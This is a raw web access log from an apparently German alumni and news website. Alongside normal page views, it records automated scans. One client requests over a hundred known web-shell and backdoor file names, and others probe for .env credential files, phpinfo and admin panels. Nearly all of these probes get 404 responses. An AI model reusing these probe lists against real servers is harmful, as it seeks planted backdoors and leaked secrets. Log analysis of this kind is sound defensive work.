b6e18e34572192e962e722509613b7c28d574e3d8da8567ac56cc2c9a4dd770c;2025-11-03 00:19:55;;/personen/alumni/schule/9001;GET;200
d84022659f65be93d01f09a8534e7f377bb0f179e5b08de77e2f2dd691931d2b;2025-11-03 00:26:14;;/personen/alumni/schule/68457;GET;200
9c6263fc5a8b5246231b485100c832e59a0113aa43de37eedfa060194799e609;2025-11-03 00:32:29;;/personen/alumni/schule/03A04;GET;200
316639eb319757e5fa5c501f9c232e2ba50aaf7239efdec7a6b5856b61e2d839;2025-11-03 00:38:23;;/aktuelles/meldungen;GET;200
16c5cf9b94a7ec02f8422355cad7ad0557c365e94a4bea37a8ec9048b3c9c00f;2025-11-03 00:41:38;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-03 00:42:51;/aktuelles/meldungen?category=wissenschaft;/aktuelles/meldungen?category=wissenschaft;GET;200
0c072e4d5f352cd878f1308a9d7cffbebf013417a3f60b1849b17e6162cd05f4;2025-11-03 00:44:47;;/personen/alumni/schule/07A05;GET;200
4a26009ab907003367465a1559bc3a572ec3ae6d56110d85e8adfc8b884f9542;2025-11-03 00:51:01;;/personen/alumni/schule/0349;GET;200
287bbdd1077cc37dd589520b45baccc195d329d053a429509c3362743be2737f;2025-11-03 00:56:47;;/personen/alumni/schule/0350;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-03 00:58:40;/personen;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
8d84d10fd156142206ea74f91d45b4c7c98ffe84b8de8bbc9f54b8c46953cc08;2025-11-03 01:02:57;;/personen/alumni/schule/164094;GET;200
1411335da6b871ad18d7b87ccdef9a0ea78d1dc37d4b098e63de58ed2de3c6cd;2025-11-03 01:05:35;;/;GET;200
5d224c420dc6fc85e69785e7c7dc01d3aec9ec1994469a753bf29081dc33202a;2025-11-03 01:09:28;;/;GET;200
4d7d9ae88d9a44e020f092e91f4a241c8d4685234e820655345a090cf3adbbc1;2025-11-03 01:09:59;;/personen/alumni/schule/188001;GET;200
a1cf57ae1eb9cbb05f04c59b75443eea95c6b14f231494e82296a9b89ce5103e;2025-11-03 01:10:47;;/personen/alumni/details/josephine-muller;GET;200
5d224c420dc6fc85e69785e7c7dc01d3aec9ec1994469a753bf29081dc33202a;2025-11-03 01:13:52;;/webui/;GET;404
33b3d3ef6a6a6239f0f425d8dfb45b53df5e158e43125502c71d058082661af9;2025-11-03 01:16:09;;/personen/alumni/schule/9004;GET;200
d7201a7cc9ddcd27933408bf4192637ff990ead8d8ab59a5170198c61d47cf5e;2025-11-03 01:18:55;;/;GET;200
dbde0f3861f807114f3aaf89a45b865606b7d950845b702ddd0402fd36fdb975;2025-11-03 01:22:00;;/personen/alumni/schule/9002;GET;200
425e4e2f3c7a172e11c96e98c19ba13ad149e2340cfb2c54521599b7b1ed36e2;2025-11-03 01:23:53;;/+CSCOE+/logon.html;GET;404
49c1ccd28e90d698777e8881d76cb3f02ccf9b58ef98754e8f74271979e79bd5;2025-11-03 01:26:29;;/;GET;200
26e3a6af9117f04f1ebaf19b217865a08f9698ebae4284fb45e0389fd3697261;2025-11-03 01:28:24;;/personen/alumni/schule/183052;GET;200
5d224c420dc6fc85e69785e7c7dc01d3aec9ec1994469a753bf29081dc33202a;2025-11-03 01:30:47;;/geoserver/web/;GET;404
12c786b552e6cda99348c730aca892af76572086617f20b1fce0b4897a8431ac;2025-11-03 01:32:50;;/;GET;200
14a6140b84220d5f09d05cbf808fb5841e81fe58761556a27bb3635bf71c7137;2025-11-03 01:34:38;;/;GET;200
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:19;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:21;;/error.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:21;;/031.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:22;;/ilex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:22;;/flex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:23;;/18299.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:23;;/mlex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:24;;/wlex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:24;;/wp-aaa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:25;;/klex.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:25;;/about3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:26;;/222.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:26;;/444.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:27;;/file9.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:27;;/filesss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:28;;/file88.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:28;;/gifclass4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:29;;/class-wp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:29;;/555.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:30;;/333.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:31;;/hly.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:31;;/d12.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:32;;/2clas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:32;;/bless5.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:33;;/file15.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:33;;/hk.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:34;;/alpa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:34;;/file21.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:35;;/ssss.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:35;;/ut.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:36;;/inde.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:36;;/classgoto24.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:37;;/030.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:37;;/thh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:38;;/fffff.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:38;;/indo.php;GET;404
8917f7e79eeca603bd1c8dc9b95d02ade7fb94c3445f43634102d6aeacd0e06d;2025-11-03 01:46:38;;/personen/alumni/schule/164045;GET;200
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:39;;/fileas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:39;;/yellow.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:40;;/33.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:40;;/plss3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:41;;/he.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:41;;/thxt.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:42;;/wfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:42;;/class20.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:43;;/build.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:44;;/1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:44;;/usep.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:45;;/wa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:45;;/wb.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:46;;/file1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:46;;/2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:47;;/a2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:47;;/a.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:48;;/gmo.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:48;;/info.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:49;;/file2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:49;;/lv.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:50;;/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:50;;/abcd.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:51;;/lock360.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:51;;/alfa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:52;;/NewFile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:52;;/atomlib.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:53;;/--.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:53;;/system_log.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:54;;/pp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:54;;/geck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:55;;/gm.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:56;;/makeasmtp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:56;;/cccc.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:57;;/file4.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:57;;/520.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:58;;/admin.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:58;;/7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:59;;/CLA.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:46:59;;/file18.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:00;;/ffile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:00;;/file7.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:01;;/we.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:01;;/gfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:02;;/jlex3.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:02;;/des.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:03;;/aaa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:03;;/gifclass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:04;;/vee.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:04;;/efile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:05;;/afile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:05;;/errorfile.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:06;;/f35.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:06;;/gool.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:07;;/haikh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:07;;/135.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:08;;/enclas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:09;;/ioxi-o.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:09;;/wp-admin/js/wp-conflg.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:10;;/classwithtostring.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:10;;/image.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:11;;/wp-admin/wp-conflg.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:11;;/mail.php?;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:12;;/sx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:12;;/max.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:13;;/size.php?p=;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:13;;/mpxct.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:14;;/0xx.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:14;;/s.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:15;;/hq.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:15;;/blox.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:16;;/ant.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:16;;/fso.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:17;;/htaccess.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:17;;/wp-trackback.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:18;;/wp-admin/about.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:18;;/readme.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:19;;/v.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:19;;/sck.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:20;;/X7x.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:20;;/xpass.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:21;;/zoz.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:22;;/bless.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:22;;/bless2.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:23;;/bless6.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:23;;/bless10.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:24;;/bless11.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:24;;/wp-admin/js/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:25;;/thoms.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:25;;/xcre1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:26;;/xsas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:26;;/xrp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:27;;/wp-freya.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:27;;/jatuh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:28;;/css/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:28;;/file30.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:29;;/fesa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:29;;/class-.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:30;;/.well-known/gecko-litespeed.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:30;;/wp-includes/block-patterns/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:31;;/up.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-03 01:47:31;;/403.php;GET;404
ce10f81a95aabb08a38882ae487c82c706655149b3f083481ebf29ef3fb99ff3;2025-11-03 01:55:25;;/about/allgemein;GET;200
316eefdf1ed4bdfc59e5e0ec5320cae11e138da8a44ef6b593d4f8193cfe3fd8;2025-11-03 01:59:26;;/;GET;200
dc6229791ce398ba60d52b9b5a654e01665c5bd770cf609cbe249e0799f9a6dc;2025-11-03 02:03:27;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
97416a1459470bbc150f8ab74b40149c594a7c1013a72815cd82dfe1fb602bb5;2025-11-03 02:10:39;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b8b5801e8723803ce7d771eb5f46cdf068214636eccd53cb120ee4c6e5677c37;2025-11-03 02:17:45;;/personen/alumni/schule/9001;GET;200
4e6daa9600698b5c00ddf4e206184c0f65220d507c1e3c434fef4af567885ca4;2025-11-03 02:20:55;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 02:22:04;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 02:22:04;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 02:22:25;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 02:22:25;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
a59979cd318941c225e2019451138a9899d67c826ed714b4f6fcabd96ca53e1b;2025-11-03 02:23:19;;/;GET;200
12e169a9ae1dff2a2d033f30512c953f7152abea83a65c832aa55d83f047463d;2025-11-03 02:23:59;;/;GET;200
8b486169b11d9ae962e4a4a4e29ea90180054a5c217bc9c1a1b89a7383dfbc8d;2025-11-03 02:24:43;;/personen/alumni/schule/HB0002;GET;200
113408a9f3eada1ab4f0d74b94b299f950aa82c2201bea5a669ce7562b2fa8c6;2025-11-03 02:25:11;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-03 02:27:29;;/personen/alumni/details/benjamin-wagner;GET;200
fc1c61c38a857a4a016eb3d7052b96f4814204a12a5f6fff2afb973616c8ec42;2025-11-03 02:29:06;;/;GET;200
6e320bcc833ec74d087264c17d415311fdee896cc1c7b18b0bd37071b605920a;2025-11-03 02:31:37;;/personen/alumni/schule/MP001;GET;200
3fff2afd5495e83004dc71fa30ed2cb0d1baeefcc97a7faa006a070c5f56e216;2025-11-03 02:37:51;;/personen/alumni/schule/SHH001;GET;200
e841f0f8507cd7bcc0eb742b1e85d27408be2a4ae19fc499ab04615b1641c970;2025-11-03 02:44:07;;/personen/alumni/schule/MP004;GET;200
91f02f323ebaa1cdad2b838a058bb149c4dc5e4866b6ac7bcad483a64177d334;2025-11-03 02:50:32;;/personen/alumni/schule/9009;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-03 02:52:29;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
19804e112d1371ce58ea6bbefad73530e9ec3b65b67320fe869a8f233140c61d;2025-11-03 02:57:13;;/personen/alumni/schule/01A04;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:00:53;;/app_dev.php/_profiler/phpinfo;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:00:53;;/?phpinfo=-1;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:00:57;;/local.env;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:00:59;;/example.env;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:01:04;;/phpinfos.php;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-03 03:01:09;;/logon.env;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-03 03:03:13;/personen;/personen/all/3;GET;200
7e8df0850b25cd5902429bd55d3355394951c94166391d0b8bd41883b32661f7;2025-11-03 03:03:18;;/personen/alumni/schule/10A04;GET;200
f47374a7995901f69f9c347e55c727d7f24bff73702fcceffb43cc7615062e0f;2025-11-03 03:07:48;/;/;GET;200
150d4de8f8d28c911bf5a83e2f84f76e9449b93d0b246cb7b43bacf6b21c117c;2025-11-03 03:09:27;;/;GET;200
9aef98f07cdfc17c127b502b6d6598fbcdef7333a33fc1f542beee6cb028c253;2025-11-03 03:09:44;;/personen/alumni/schule/04A04;GET;200
c4f59ad79ab901db4ae4c1c03f4ad9e575adfd04bc5cfd0b2c69e05a5e2d9390;2025-11-03 03:16:42;;/personen/alumni/schule/SL001;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-03 03:17:29;;/personen/alumni/schule/4340014;GET;200
67b71cf8bd9127f3e302cb998c536ccc8f85183c222e14ffa53b911d852bc387;2025-11-03 03:23:12;;/personen/alumni/schule/620014;GET;200
a60261dc579245d84b1a4c3542b511441f9f74db9e5431ab48a44c07d29d6adc;2025-11-03 03:29:27;;/personen/alumni/schule/04A06;GET;200
70785b0ab75df9b61fbab6c552c43831bda7b93e91556399a22c8ea4d04dcb50;2025-11-03 03:38:26;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-03 03:42:29;;/personen/alumni/schule/10A04;GET;200
6694aa2890e83f1877abf0f02d954e1337bb0ac91c9efb31aa36726f95fdaff1;2025-11-03 03:46:37;/sql/websql/index.php?lang=en;/sql/websql/index.php?lang=en;GET;404
6694aa2890e83f1877abf0f02d954e1337bb0ac91c9efb31aa36726f95fdaff1;2025-11-03 03:46:38;/admin/phpMyAdmin/index.php?lang=en;/admin/phpMyAdmin/index.php?lang=en;GET;404
